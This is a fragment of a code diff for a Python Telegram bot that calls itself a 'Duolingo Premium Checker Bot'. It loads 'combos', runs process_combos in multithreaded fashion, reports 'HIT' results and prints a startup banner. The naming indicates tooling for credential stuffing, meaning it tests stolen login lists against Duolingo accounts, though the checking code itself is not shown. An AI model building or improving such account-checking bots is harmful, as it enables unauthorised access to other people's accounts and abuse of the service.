+    bot.edit_message_text(f"📥 `{len(combos)}` combos loaded.\n🚀 Starting with {MAX_THREADS} threads...", status_msg.chat.id, status_msg.message_id, parse_mode='Markdown')
     
-    thread = threading.Thread(target=process_combos, args=(message.chat.id, combos, status_msg.message_id))
+    thread = threading.Thread(target=process_combos, args=(message.chat.id, combos))
     thread.daemon = True
     thread.start()
 
 print("🤖 Duolingo Premium Checker Bot is running...")
-print(f"Config: [ DUOLINGO ] BY ThuYa V3")
-print(f"Author: @thuyaaungzaw")
-print(f"Admin IDs: {ADMIN_IDS}")
-print(f"Threads: {MAX_THREADS}")
-print("Features: HIT sent immediately | Inline HIT list | No TXT files | /stop immediate")
+print("═" * 50)
+print(f"  Admin IDs: {ADMIN_IDS}")
+print(f"  Threads: {MAX_THREADS}")
+print(f"  Features: Box UI | Inline Menu | No TXT Files")
+print("═" * 50)
 bot.infinity_polling()
